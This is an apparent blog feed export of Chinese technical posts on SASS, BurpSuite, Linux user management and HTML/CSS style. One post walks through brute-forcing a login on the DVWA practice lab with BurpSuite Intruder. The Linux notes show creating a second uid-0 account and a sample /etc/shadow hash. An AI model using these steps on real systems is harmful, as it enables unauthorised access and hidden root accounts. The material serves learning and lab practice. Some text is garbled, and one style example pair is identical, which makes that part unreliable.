</code></pre><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>SASS 共有两种注释风格。</p><p>标准的 CSS 注释 <code>/* comment */</code> ，会保留到编译后的文件。 单行注释 <code>// comment</code>，只保留在 SASS 源文件中，编译后被省略。</p><p>在 <code>/*</code> 后面加一个感叹号，表示这是”重要注释”。即使是压缩模式编译，也会保留这行注释，通常可以用于声明版权信息。</p><pre><code class="scss">/*!
 * 重要注释！
 */
</code></pre><h1 id="代码的重用"><a href="#代码的重用" class="headerlink" title="代码的重用"></a>代码的重用</h1><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>SASS 允许一个选择器，继承另一个选择器。比如，现有 <code>class1</code>：</p><pre><code class="scss">.class1 {
  border: 1px solid #ddd;
}
</code></pre><p><code>class2</code> 要继承 <code>class1</code>，就要使用 <code>@extend</code> 命令：</p><pre><code class="scss">.class2 {
  @extend .class1;
　font-size: 120%;
}
</code></pre><h2 id="Mixin"><a href="#Mixin" class="headerlink" title="Mixin"></a>Mixin</h2><p>Mixin 有点像 C 语言的宏（<code>macro</code>），是可以重用的代码块。 使用 <code>@mixin</code> 命令，定义一个代码块。</p><pre><code class="scss">@mixin left {
  float: left;
　margin-left: 10px;
}
</code></pre><p>使用 <code>@include</code> 命令，调用这个 <code>mixin</code>。</p><pre><code class="scss">div {
  @include left;
}
</code></pre><p><code>mixin</code> 的强大之处，在于可以指定参数和缺省值。</p><pre><code class="scss">@mixin left($value: 10px) {
  float: left;
　margin-right: $value;
}
</code></pre><p>使用的时候，根据需要加入参数：</p><pre><code class="scss">div {
  @include left(20px);
}
</code></pre><p>下面是一个 <code>mixin</code> 的实例，用来生成浏览器前缀。</p><pre><code class="scss">@mixin rounded($vert, $horz, $radius: 10px) {
  border-#{$vert}-#{$horz}-radius: $radius;
　-moz-border-radius-#{$vert}#{$horz}: $radius;
　-webkit-border-#{$vert}-#{$horz}-radius: $radius;
}
</code></pre><p>使用的时候，可以像下面这样调用：</p><pre><code class="scss">#navbar li {
  @include rounded(top, left);
}

#footer {
  @include rounded(top, left, 5px);
}
</code></pre><h2 id="颜色函数"><a href="#颜色函数" class="headerlink" title="颜色函数"></a>颜色函数</h2><p>SASS 提供了一些内置的颜色函数，以便生成系列颜色。</p><pre><code class="scss">lighten(#cc3, 10%)    // #d6d65c
darken(#cc3, 10%)     // #a3a329
grayscale(#cc3)       // #808080
complement(#cc3)      // #33c
</code></pre><h2 id="插入文件"><a href="#插入文件" class="headerlink" title="插入文件"></a>插入文件</h2><p><code>@import</code> 命令，用来插入外部文件。</p><pre><code class="scss">@import &quot;path/filename.scss&quot;;
</code></pre><p>如果插入的是 <code>.css</code> 文件，则等同于 css 的 <code>import</code> 命令。</p><pre><code class="scss">@import &quot;foo.css&quot;;
</code></pre><h1 id="高级用法"><a href="#高级用法" class="headerlink" title="高级用法"></a>高级用法</h1><h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><p><code>@if</code> 可以用来判断：</p><pre><code class="scss">p {
  @if 1 + 1 == 2 { border: 1px solid; }
　@if 5 &lt; 3 { border: 2px dotted; }
}
</code></pre><p>配套的还有 <code>@else</code> 命令：</p><pre><code class="scss">@if lightness($color) &gt; 30% {
  background-color: #000;
} @else {
  background-color: #fff;
}
</code></pre><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><p>SASS 支持 <code>for</code> 循环：</p><pre><code class="scss">@for $i from 1 to 10 {
  .border-#{$i} {
    border: #{$i}px solid blue;
  }
}
</code></pre><p>也支持 <code>while</code> 循环：</p><pre><code class="scss">$i: 6;
@while $i &gt; 0 {
  .item-#{$i} {
    width: 2em * $i;
  }
　 $i: $i - 2;
}
</code></pre><p><code>each</code> 命令，作用与 <code>for</code> 类似：</p><pre><code class="scss">@each $member in a, b, c, d {
  .#{$member} {
    background-image: url(&quot;/image/#{$member}.jpg&quot;);
　}
}
</code></pre><h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><p>SASS 允许用户编写自市场上市己的函数。</p><pre><code class="scss">@function double($n) {
  @return $n * 2;
}

#sidebar {
　width: double(5px);
}
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> manual </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> SASS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透工具用法（二）：BurpSuite 的用法]]></title>
      <url>/2016/10/usage-of-burp/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>此系列笔记是网络渗透工具的使用方法，本篇是介绍 Web 应用程序测试工具 BurpSuite 的使用方法。Burp Suite 其多种功能可以帮我们执行各种任务，请求的拦截和修改，扫描 web 应用程序漏洞，以暴力破解登陆表单，执行会话令牌等多种的随机性检查<a id="more"></a></p><h1 id="Burp-Suite-环境"><a href="#Burp-Suite-环境" class="headerlink" title="Burp Suite 环境"></a>Burp Suite 环境</h1><blockquote><p><code>kali Liunx</code>里已经集成了 Burp Suite 工具，<code>windows</code> 下安装 Burp Suite 之前请确定你的电脑里有 Java 环境<br><br><a href="//portswigger.net/burp/download.html">Burp Suite 官网下载地址</a></p></blockquote><h2 id="JDK-安装和环境变量配置"><a href="#JDK-安装和环境变量配置" class="headerlink" title="JDK 安装和环境变量配置"></a>JDK 安装和环境变量配置</h2><p><code>windows</code> 下安装 Burp Suite 需要 Java 环境进行支持，由于本博客之前是有写过 JDK 的安装和环境变量的配置，所以这里不再提供。</p><h1 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h1><p>Burp Suite 带有一个代理，通过默认端口 <code>8080</code> 上运行，使用这个代理，我们可以截获并修改从客户端到 web 应用程序的数据包。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-1.png" alt="Burp Suite"></p><p>这里我们使用 <code>Chrome</code> 浏览器，在 <code>Chrome</code> 浏览器里也需要设置代理方式<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-2.png" alt="Burp Suite"></p><h1 id="拦截改包和暴力破解"><a href="#拦截改包和暴力破解" class="headerlink" title="拦截改包和暴力破解"></a>拦截改包和暴力破解</h1><h2 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h2><blockquote><p>这里使用漏洞集成平台 <code>DVWA</code> 来进行测试</p></blockquote><p><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-3.png" alt="Burp Suite"></p><h2 id="拦截请求包"><a href="#拦截请求包" class="headerlink" title="拦截请求包"></a>拦截请求包</h2><p>随意输入密码（这里填写的密码为 <code>123</code>），点击登录，在 Burp Suite 里就可以看到拦截的请求包（前提是设置好代理）<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-4.png" alt="Burp Suite"></p><h2 id="修改请求包"><a href="#修改请求包" class="headerlink" title="修改请求包"></a>修改请求包</h2><p>将拦截到的数据包 <code>Send to Intruder</code>（也可以使用 <code>Ctrl+I</code>）<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-5.png" alt="Burp Suite"></p><p>在 <code>Position</code> 选项中设置需要破解的变量。<code>Burpsuite</code> 会自动设置许多变量，单击 <code>Clear</code> 按钮，把默认变量全部清除，然后选中密码 <code>123</code>，单击 <code>Add</code> 按钮将之设为需要破解的变量。由于只有一个变量，因而 <code>Attack type</code> 攻击类型这里选择 <code>Sniper</code>。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-6.png" alt="Burp Suite"></p><h2 id="添加字典"><a href="#添加字典" class="headerlink" title="添加字典"></a>添加字典</h2><p>在 <code>Payloads</code> 选项中进行设置，由于只有一个变量，因而 <code>Payload set</code> 自动设置为 1，<code>Payload type</code> 这里设置为 <code>Simple list</code>。在下面的 <code>Payload Options</code> 中，我们添加可能的密码，或者密码。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-7.png" alt="Burp Suite"></p><h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><p>在菜单栏中选择 <code>Intruder/Start attack</code>，就可以开始暴力破解。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-8.png" alt="Burp Suite"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在 <code>Results</code> 中，双击 <code>length</code> 进行排序，在这里所有登录成功或者登录失败的记录全部在这里。<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-9.png" alt="Burp Suite"></p><p>选中请求字节包最大的，在 <code>Response/Render</code> 里就可以看到 <code>Welcome to the password protected area admin</code> 成功登录的信息<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-10.png" alt="Burp Suite"></p><h1 id="Decode-和-Encode"><a href="#Decode-和-Encode" class="headerlink" title="Decode 和 Encode"></a>Decode 和 Encode</h1><p>Decoder 转化成规范的形式编码数据，或转化成各种形式编码和散列的原始数据。它能够智能识别多种编码格式，使用启发式技术。</p><p>下面这张图是将一段 URL 进行 encode（编码）<br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/burp-11.png" alt="Burp Suite"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> pentest </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
            <tag> Pentest </tag>
            
            <tag> Protocol </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 学习笔记（六）：用户的管理]]></title>
      <url>/2016/10/user-management/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的学习笔记系列第五篇，这一篇将介绍 Liunx 下用户的管理。用户管理看似很简单，但是里面还隐藏着大学问呢<a id="more"></a></p><h1 id="添加用户，并创建用户宿主目录"><a href="#添加用户，并创建用户宿主目录" class="headerlink" title="添加用户，并创建用户宿主目录"></a>添加用户，并创建用户宿主目录</h1><p><code>For Example:</code></p><pre><code class="bash">useradd -m [userName]
</code></pre><h1 id="删除用户，并删除用户宿主目录"><a href="#删除用户，并删除用户宿主目录" class="headerlink" title="删除用户，并删除用户宿主目录"></a>删除用户，并删除用户宿主目录</h1><p><code>For Example:</code></p><pre><code class="bash">userdel -r [userName]
</code></pre><h1 id="添加-uid-为-0-的用户"><a href="#添加-uid-为-0-的用户" class="headerlink" title="添加 uid 为 0 的用户"></a>添加 uid 为 0 的用户</h1><p><code>For Example:</code></p><pre><code class="bash">useradd -u 0 -o [userName]
</code></pre><h1 id="查看用户的-uid-或-gid-等信息"><a href="#查看用户的-uid-或-gid-等信息" class="headerlink" title="查看用户的 uid 或 gid 等信息"></a>查看用户的 uid 或 gid 等信息</h1><p><code>For Example:</code></p><pre><code class="bash">id [userName]
</code></pre><h1 id="为用户添加密码"><a href="#为用户添加密码" class="headerlink" title="为用户添加密码"></a>为用户添加密码</h1><p><code>For Example:</code></p><pre><code class="bash">passwd [userName]                                   # 普通方法
echo &quot;passwd string&quot; | passwd --stdin [userName]    # 输出文本内容作为密码
</code></pre><blockquote><p>普通用户修改密码命令： passwd</p></blockquote><h1 id="查看用户的密码状态"><a href="#查看用户的密码状态" class="headerlink" title="查看用户的密码状态"></a>查看用户的密码状态</h1><p><code>For Example:</code></p><pre><code class="bash">passwd -S [userName]                      # 普通方法
cat /etc/passwd | grep [userName]         # 查看配置文件
</code></pre><h1 id="禁用和解锁用户"><a href="#禁用和解锁用户" class="headerlink" title="禁用和解锁用户"></a>禁用和解锁用户</h1><h2 id="passwd-方法"><a href="#passwd-方法" class="headerlink" title="passwd 方法"></a>passwd 方法</h2><p><code>For Example:</code></p><pre><code class="bash">passwd -l [userName]    # 禁用
passwd -u [userName]    # 解锁
</code></pre><h2 id="修改-etc-shadow-文件（root-用户）"><a href="#修改-etc-shadow-文件（root-用户）" class="headerlink" title="修改 /etc/shadow 文件（root 用户）"></a>修改 /etc/shadow 文件（root 用户）</h2><p><code>For Example:</code></p><pre><code class="bash">vim /etc/shadow
</code></pre><p>禁用则在密码位前手工添加 <code>!</code> （启用删除 <code>!</code> 即可）</p><pre><code class="bash">test:!$1$afiVSYfG$utdc2qWLNrqNcy63Ca8301:16998:0:99999:7:::     # 只加一个 ！
test:!!$1$afiVSYfG$utdc2qWLNrqNcy63Ca8301:16998:0:99999:7:::    # 加两个，效果一致
</code></pre><p>使用 <code>:wq!</code> 强制保存，因为其权限为 <code>000</code></p><h2 id="usermod-方法"><a href="#usermod-方法" class="headerlink" title="usermod 方法"></a>usermod 方法</h2><p><code>For Example:</code></p><pre><code class="bash">usermod -L [userName]    # 禁用
usermod -U [userName]    # 解锁
</code></pre><h1 id="设置用户一登录就要修改密码"><a href="#设置用户一登录就要修改密码" class="headerlink" title="设置用户一登录就要修改密码"></a>设置用户一登录就要修改密码</h1><p><code>For Example:</code></p><pre><code class="bash">chage -d 0 [userName]
# 这个命令其实是把密码修改日期归 0 了 （/etc/shadow 文件第 3 个字段）
</code></pre><h1 id="查看当前登录的用户是谁"><a href="#查看当前登录的用户是谁" class="headerlink" title="查看当前登录的用户是谁"></a>查看当前登录的用户是谁</h1><p><code>For Example:</code></p><pre><code class="bash">whoami
</code></pre><h1 id="查看当前登录的用户的环境变量"><a href="#查看当前登录的用户的环境变量" class="headerlink" title="查看当前登录的用户的环境变量"></a>查看当前登录的用户的环境变量</h1><p><code>For Example:</code></p><pre><code class="bash">env
</code></pre><h1 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h1><p><code>For Example:</code></p><pre><code class="bash">su - [userName]
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> Security </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[HTML 和 CSS 代码规范]]></title>
      <url>/2016/10/html-and-css-code-criterion/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>介绍 HTML 和 CSS 的格式和代码规范，旨在提高代码质量和协作效率<a id="more"></a></p><h1 id="通用样式规范"><a href="#通用样式规范" class="headerlink" title="通用样式规范"></a>通用样式规范</h1><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>省略图片、样式、脚本以及其他媒体文件 URL 的协议部分（ <code>http:</code>，<code>https:</code> ），除非文件在两种协议下都不可用。这种方案称为 <code>protocol-relative URL</code>，好处是无论你是使用 <code>HTTPS</code> 还是 <code>HTTP</code> 访问页面，浏览器都会以相同的协议请求页面中的资源，同时可以节省一部分字节。</p><p><code>For Example:</code></p><pre><code class="html">&lt;!-- Low--&gt;
&lt;script src=&quot;//www.google.com/js/gweb/analytics/autotrack.js&quot;&gt;&lt;/script&gt;

&lt;!-- Good --&gt;
&lt;script src=&quot;//www.google.com/js/gweb/analytics/autotrack.js&quot;&gt;&lt;/script&gt;
</code></pre><pre><code class="css">/* Low */
.example {
  background: url(//www.google.com/images/example);
}

/* Good */
.example {
  background: url(//www.google.com/images/example);
}
</code></pre><h1 id="通用格式规范"><a href="#通用格式规范" class="headerlink" title="通用格式规范"></a>通用格式规范</h1><h2 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h2><p>一次缩进 2 个空格，不要使用 tab 或者混合 tab 和空格的缩进。</p><p><code>For Example:</code></p><pre><code class="html">&lt;ul&gt;
  &lt;li&gt;Fantastic
  &lt;li&gt;Great
&lt;/ul&gt;
</code></pre><pre><code class="css">.example {
  color: blue;
}
</code></pre><h2 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h2><p>以下都应该用小写：HTML 元素名称，属性，属性值（除非 text/CDATA），CSS 选择器，属性，属性值。</p><p><code>For Example:</code></p><pre><code class="html">&lt;!-- Low --&gt;
&lt;A HREF=&quot;/&quot;&gt;Home&lt;/A&gt;

&lt;!-- Good --&gt;
&lt;img src=&quot;google.png&quot; alt=&quot;Google&quot;&gt;
</code></pre><pre><code class="css">/* Low */
.example {
  color: #E5E5E5;
}

/* Good */
.example {
  color: #e5e5e5;
}
</code></pre><h2 id="结尾空格"><a href="#结尾空格" class="headerlink" title="结尾空格"></a>结尾空格</h2><p>结尾空格不仅多余，而且在比较代码时会更麻烦。</p><p><code>For Example:</code></p><pre><code class="html">&lt;!-- Low --&gt;
&lt;p&gt;What?&lt;p&gt;

&lt;!-- Good --&gt;
&lt;p&gt;Yes please.&lt;/p&gt;
</code></pre><h1 id="通用元规范"><a href="#通用元规范" class="headerlink" title="通用元规范"></a>通用元规范</h1><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>在 HTML 中通过 <code>&lt;meta charset=&quot;utf-8&quot;&gt;</code> 指定编码方式，CSS 中不需要指定，因为默认是 UTF-8。</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>使用注释来解释代码：包含的模块，功能以及优点。</p><h2 id="任务项"><a href="#任务项" class="headerlink" title="任务项"></a>任务项</h2><p>用 TODO 来标记待办事项，而不是用一些其他的标记，像 @@。</p><p><code>For Example:</code></p><pre><code class="html">&lt;!-- TODO: remove optional tags --&gt;
&lt;ul&gt;
  &lt;li&gt;Apples&lt;/li&gt;
  &lt;li&gt;Oranges&lt;/li&gt;
&lt;/ul&gt;
</code></pre><h1 id="HTML-风格规范"><a href="#HTML-风格规范" class="headerlink" title="HTML 风格规范"></a>HTML 风格规范</h1><h2 id="文档类型"><a href="#文档类型" class="headerlink" title="文档类型"></a>文档类型</h2><p>HTML 文档应使用 HTML5 的文档类型：<code>&lt;!DOCTYPE html&gt;</code>。</p><p>孤立标签无需封闭自身，如：<code>&lt;br&gt;</code> 不要写成 <code>&lt;br /&gt;</code>。</p><h2 id="HTML-正确性"><a href="#HTML-正确性" class="headerlink" title="HTML 正确性"></a>HTML 正确性</h2><p>尽可能使用正确的 HTML。</p><p><code>For Example:</code></p><pre><code class="html">&lt;!-- Low --&gt;
&lt;title&gt;Test&lt;/title&gt;
&lt;article&gt;This is only a test.

&lt;!-- Good --&gt;
&lt;!DOCTYPE html&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Test&lt;/title&gt;
&lt;article&gt;This is only a test.&lt;/article&gt;
</code></pre><h2 id="语义化"><a href="#语义化" class="headerlink" title="语义化"></a>语义化</h2><p>根据使用场景选择正确的 HTML 元素（有时被错误的称为”标签”）。例如，使用 h1 元素创建标题，p 元素创建段落，a 元素创建链接等等。正确的使用 HTML 元素对于可访问性、可重用性以及编码效率都很重要。</p><p><code>For Example:</code></p><pre><code class="html">&lt;!-- Low --&gt;
&lt;div onclick=&quot;goToRecommendations();&quot;&gt;All recommendations&lt;/div&gt;

&lt;!-- Good --&gt;
&lt;a href=&quot;recommendations/&quot;&gt;All recommendations&lt;/a&gt;
</code></pre><h2 id="多媒体元素降级"><a href="#多媒体元素降级" class="headerlink" title="多媒体元素降级"></a>多媒体元素降级</h2><p>对于像图片、视频、canvas 动画等多媒体元素，确保提供其他可访问的内容。图片可以使用替代文本（alt），视频和音频可以使用文字版本。</p><p><code>For Example:</code></p><pre><code class="html">&lt;!-- Low --&gt;
&lt;img src=&quot;spreadsheet.png&quot;&gt;

&lt;!-- Good --&gt;
&lt;img src=&quot;spreadsheet.png&quot; alt=&quot;Spreadsheet screenshot.&quot;&gt;
</code></pre><h2 id="关注分离"><a href="#关注分离" class="headerlink" title="关注分离"></a>关注分离</h2><p>标记、样式和脚本分离，确保相互耦合最小化。</p><h2 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h2><p>如果团队中文件和编辑器使用同样的编码方式，就没必要使用实体引用，除了一些在 HTML 中有特殊含义的字符（如 <code>&lt;</code> 和 <code>&amp;</code>）以及不可见的字符（如空格）。</p><p><code>For Example:</code></p><pre><code class="html">&lt;!-- Low --&gt;
The currency symbol for the Euro is “&amp;eur;”.

&lt;!-- Good --&gt;
The currency symbol for the Euro is “€”.
</code></pre><h2 id="type-属性"><a href="#type-属性" class="headerlink" title="type 属性"></a>type 属性</h2><p>在引用样式表和脚本时，不要指定 type 属性，除非不是 CSS 或 JavaScript。</p><p>因为 HTML5 中已经默认指定样式变的 type 是 <code>text/css</code>，脚本的 type 是 <code>text/javascript</code>。</p><p><code>For Example:</code></p><pre><code class="html">&lt;!-- Low --&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;//www.google.com/css/maia.css&quot; type=&quot;text/css&quot;&gt;

&lt;!-- Good --&gt;
&lt;link rel=&quot;stylesheet&quot; href=&quot;//www.google.com/css/maia.css&quot;&gt;


&lt;!-- Low --&gt;
&lt;script src=&quot;//www.google.com/js/gweb/analytics/autotrack.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;

&lt;!-- Good --&gt;
&lt;script src=&quot;//www.google.com/js/gweb/analytics/autotrack.js&quot;&gt;&lt;/script&gt;
</code></pre><h1 id="HTML-格式规范"><a href="#HTML-格式规范" class="headerlink" title="HTML 格式规范"></a>HTML 格式规范</h1><h2 id="HTML-引号"><a href="#HTML-引号" class="headerlink" title="HTML 引号"></a>HTML 引号</h2><p>属性值用双引号。 <code>For Example:</code></p><pre><code class="html">&lt;!-- Low --&gt;
&lt;a class=&#39;maia-button maia-button-secondary&#39;&gt;Sign in&lt;/a&gt;

&lt;!-- Good --&gt;
&lt;a class=&quot;maia-button maia-button-secondary&quot;&gt;Sign in&lt;/a&gt;
</code></pre><h1 id="CSS-风格规范"><a href="#CSS-风格规范" class="headerlink" title="CSS 风格规范"></a>CSS 风格规范</h1><h2 id="ID-和-Class-命名"><a href="#ID-和-Class-命名" class="headerlink" title="ID 和 Class 命名"></a>ID 和 Class 命名</h2><p>使用有含义的 id 和 class 名称。 <code>For Example:</code></p><pre><code class="css">/* Low: 毫无意义 */
#yee-1901 {}

/* Low: 表述直觉 */
.button-green {}
.clear {}

/* Good: 具体的 */
#gallery {}
#login {}
.video {}

/* Good: 通用的 */
.aux {}
.alt {}
</code></pre><h2 id="ID-和-Class-命名风格"><a href="#ID-和-Class-命名风格" class="headerlink" title="ID 和 Class 命名风格"></a>ID 和 Class 命名风格</h2><p>id 和 class 应该尽量简短，同时要容易理解。<code>For Example:</code></p><pre><code class="css">/* Low */
#navigation {}
.atr {}

/* Good */
#nav {}
.author {}
</code></pre><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><p>除非需要，否则不要在 id 或 class 前加元素名。<code>For Example:</code></p><pre><code class="css">/* Low */
ul#example {}
div.error {}

/* Good */
#example {}
.error {}
</code></pre><h2 id="属性简写"><a href="#属性简写" class="headerlink" title="属性简写"></a>属性简写</h2><p>尽量使用 CSS 中可以简写的属性 (如 font)，可以提高编码效率以及代码可读性。<code>For Example:</code></p><pre><code class="css">/* Low */
.example {
  border-top-style: none;
  font-family: palatino, georgia, serif;
  font-size: 100%;
  line-height: 1.6;
  padding-bottom: 2em;
  padding-left: 1em;
  padding-right: 1em;
  padding-top: 0;
}

/* Good */
.example {
  border-top: 0;
  font: 100%/1.6 palatino, georgia, serif;
  padding: 0 1em 2em;
}
</code></pre><h2 id="0-和单位"><a href="#0-和单位" class="headerlink" title="0 和单位"></a>0 和单位</h2><p>值为 0 时不用添加单位。<code>For Example:</code></p><pre><code class="css">.example {
  margin: 0;
  padding: 0;
}
</code></pre><h2 id="开头的-0"><a href="#开头的-0" class="headerlink" title="开头的 0"></a>开头的 0</h2><p>值在 -1 和 1 之间时，不需要加 0。<code>For Example:</code></p><pre><code class="css">.example {
  font-size: .8em;
}
</code></pre><h2 id="16-进制表示法"><a href="#16-进制表示法" class="headerlink" title="16 进制表示法"></a>16 进制表示法</h2><p><code>For Example:</code></p><pre><code class="css">/* Low */
.example {
  color: #eebbcc;
}

/* Good */
.example {
  color: #ebc;
}
</code></pre><h2 id="前缀"><a href="#前缀" class="headerlink" title="前缀"></a>前缀</h2><p>使用带前缀的命名空间可以防止命名冲突，同时提高代码可维护性。 <code>For Example:</code></p><pre><code class="css">.adw-help {} /* AdWords */
#maia-note {} /* Maia */
</code></pre><h2 id="选择器中使用连字符可以提高可读性。"><a href="#选择器中使用连字符可以提高可读性。" class="headerlink" title="选择器中使用连字符可以提高可读性。"></a>选择器中使用连字符可以提高可读性。</h2><p><code>For Example:</code></p><pre><code class="css">/* Low: does not separate the words “demo” and “image” */
.demoimage {}

/* Low: uses underscore instead of hyphen */
.error_status {}

/* Good */
#video-id {}
.ads-sample {}
</code></pre><h1 id="CSS-格式规范"><a href="#CSS-格式规范" class="headerlink" title="CSS 格式规范"></a>CSS 格式规范</h1><h2 id="CSS-书写顺序"><a href="#CSS-书写顺序" class="headerlink" title="CSS 书写顺序"></a>CSS 书写顺序</h2><ul><li>位置属性 {<code>position</code>， <code>top</code>， <code>right</code>， <code>z-index</code>， <code>display</code>， <code>float</code> 等}</li><li>大小 {<code>width</code>， <code>height</code>， <code>padding</code>， <code>margin</code> 等}</li><li>文字系列 {<code>font</code>， <code>line-height</code>， <code>letter-spacing</code>，<code>color</code>，<code>text-align</code> 等}</li><li>背景 {<code>background</code>，<code>border</code> 等}</li><li>其他 {<code>animation</code>， <code>transition</code> 等}</li></ul><p><code>For Example:</code></p><pre><code class="css">/* Low */
.example {
  color: red;
  z-index: -1;
  background-color: #9e0;
  display: inline-block;
  font-size: 1.5em;
}

/* Good */
.example {
  z-index: -1;
  display: inline-block;
  font-size: 1.5em;
  color: red;
  background-color: #9e0;
}
</code></pre><h2 id="块级内容缩进"><a href="#块级内容缩进" class="headerlink" title="块级内容缩进"></a>块级内容缩进</h2><p>为了反映层级关系和提高可读性，块级内容都应缩进。<code>For Example:</code></p><pre><code class="css">@media screen, projection {

  html {
    background: #fff;
    color: #444;
  }

}
</code></pre><h2 id="声明结束"><a href="#声明结束" class="headerlink" title="声明结束"></a>声明结束</h2><p>每行 CSS 都应以分号结尾。<code>For Example:</code></p><pre><code class="css">/* Low */
.test {
  display: block;
  height: 100px
}

/* Good */
.test {
  display: block;
  height: 100px;
}
</code></pre><h2 id="属性名结尾"><a href="#属性名结尾" class="headerlink" title="属性名结尾"></a>属性名结尾</h2><p>属性名和值之间都应有一个空格。<code>For Example:</code></p><pre><code class="css">/* Low */
h3 {
  font-weight:bold;
}

/* Good */
h3 {
  font-weight: bold;
}
</code></pre><h2 id="声明样式块的分隔"><a href="#声明样式块的分隔" class="headerlink" title="声明样式块的分隔"></a>声明样式块的分隔</h2><p>在选择器和 {} 之间用空格隔开。<code>For Example:</code></p><pre><code class="css">/* Low: missing space */
#video{
  margin-top: 1em;
}

/* Low: unnecessary line break */
#video
{
  margin-top: 1em;
}

/* Good */
#video {
  margin-top: 1em;
}
</code></pre><h2 id="选择器分隔"><a href="#选择器分隔" class="headerlink" title="选择器分隔"></a>选择器分隔</h2><p>每个选择器都另起一行。<code>For Example:</code></p><pre><code class="css">/* Low */
a:focus, a:active {
  position: relative; top: 1px;
}

/* Good */
h1,
h2,
h3 {
  font-weight: normal;
  line-height: 1.2;
}
</code></pre><h2 id="规则分隔"><a href="#规则分隔" class="headerlink" title="规则分隔"></a>规则分隔</h2><p>规则之间都用空行隔开。<code>For Example:</code></p><pre><code class="css">html {
  background: #fff;
}

body {
  margin: auto;
  width: 50%;
}
</code></pre><h2 id="CSS-引号"><a href="#CSS-引号" class="headerlink" title="CSS 引号"></a>CSS 引号</h2><p>属性选择器和属性值用单引号，URI 的值不需要引号。<code>For Example:</code></p><pre><code class="css">/* Low */
@import url(&quot;//www.google.com/css/maia.css&quot;);

html {
  font-family: &quot;open sans&quot;, arial, sans-serif;
}

/* Good */
@import url(//www.google.com/css/maia.css);

html {
  font-family: &#39;open sans&#39;, arial, sans-serif;
}
</code></pre><h1 id="CSS-元规则"><a href="#CSS-元规则" class="headerlink" title="CSS 元规则"></a>CSS 元规则</h1><h2 id="分段注释"><a href="#分段注释" class="headerlink" title="分段注释"></a>分段注释</h2><p>用注释把 CSS 分成各个部分。<code>For Example:</code></p><pre><code class="css">/* Header */

#adw-header {}

/* Footer */

#adw-footer {}

/* Gallery */

.adw-gallery {}
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Criterion </tag>
            
            <tag> HTML5 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JDK 的安装和环境变量的配置]]></title>
      <url>/2016/09/install-jdk-on-windows/</url>
